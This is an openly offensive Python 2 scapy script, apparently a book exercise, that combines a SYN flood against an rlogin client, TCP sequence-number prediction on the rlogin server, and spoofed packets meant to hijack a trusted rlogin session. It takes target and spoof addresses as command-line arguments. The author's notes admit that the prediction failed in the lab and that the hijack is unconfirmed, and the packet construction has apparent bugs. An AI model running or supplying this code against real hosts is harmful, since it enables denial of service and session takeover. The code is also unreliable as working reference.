#!/usr/bin/env python2
from scapy.all import *
import sys, argparse, threading, time

notes="""
I mean, I get it.  Really I do.  However it was an absolute pain in the ass to set up rlogin 
for host-based, considering it's non-secure nature and all vendor implementations want to 
not-allow host-based auth by default.

Aside from this fact, main() exec provided as-is in the book is block until the syn flooding returns.  SEQ NUM prediction fails in my lab environment, due to modern implementations applying sequence randomization.  So I was not able to confirm this works, but --theoretically-- it should work.  And as a result I'm also not able to confirm the session hijack.  I would assume I inherit a remote shell?
"""

def synFLOOD(s, t, d=513):
    # packets w/ S:rlogin_server, D:rlogin_client
    for sport in range(1024, 1124):
        IPlayer = IP(src=s, dst=t)
        TCPlayer = TCP(sport=sport, dport=d)
        pkt = IPlayer / TCPlayer
        send(pkt, verbose=0)
        print("SYN flooding %s:%d -> %s:%d" % (s, sport, t, d))


def guessSeqNumTCP(targ):
    # packet targ=rlogin_server
    dport = 513
    sn = 0
    pn = 0
    diff = 0
    for i in range(1,5):
        if pn != 0:
            pn = sn
        pkt = IP(dst=targ) / TCP(dport=dport)
        ans = sr1(pkt, verbose=0)
        sn = ans.getlayer(TCP).seq
        diff = sn - pn
        print("[+] TCP SEQ DIFF: %s" % (str(diff)))
    return sn + diff


def spoofer(src, dst, ack):
    # packet S:rlogin_client, D:rlogin_server
    IPlayer = IP(src=src, dst=dst)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    synP = IPlayer / TCPlayer
    send(synP)
    IPlayer = IP(src=src, dst=dst)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackP = IPlayer /TCPlayer
    send(ackP)


def getargs():
    ap = argparse.ArgumentParser(description="Full stack syn flood, TCP seq predict, TCP hijack")
    ap.add_argument("-sf", "--synfloodtarg", type=str, default=None, help="SYN flood target")
    ap.add_argument("-ss", "--spoofIP", type=str, default=None, help="Spoof IP in constructed packet")
    ap.add_argument("-t", "--tcphijacktarg", type=str, default=None, help="TCP hijack target")
    ap.add_argument("-dp", "--destport", type=int, default=None, help="Dest port to target")
    ap.args, l = ap.parse_known_args()
    ap.ar = vars(ap.args)  # .namespace() into dict
    if None in ap.ar.values():
        ap.print_help()
        print("""spoofIP = rlogin_server, synfloodtarg = rlogin_client, tcphijacktarg = rlogin_server""")
        sys.exit()
    else:
        return ap.ar


def main():
    args = getargs()
    for key, val in args.iteritems():
        print("%s %s"% (key, val))
    synFLOOD(args['spoofIP'], args['synfloodtarg'], args['destport'])
    seq = guessSeqNumTCP(args['tcphijacktarg']) + 1
    print("[+] TCP_SEQ Predict (future ~ +150 ACK): %d" %(seq))
    spoofer(args['synfloodtarg'], args['tcphijacktarg'], int(seq))


if __name__=="__main__":
    main()

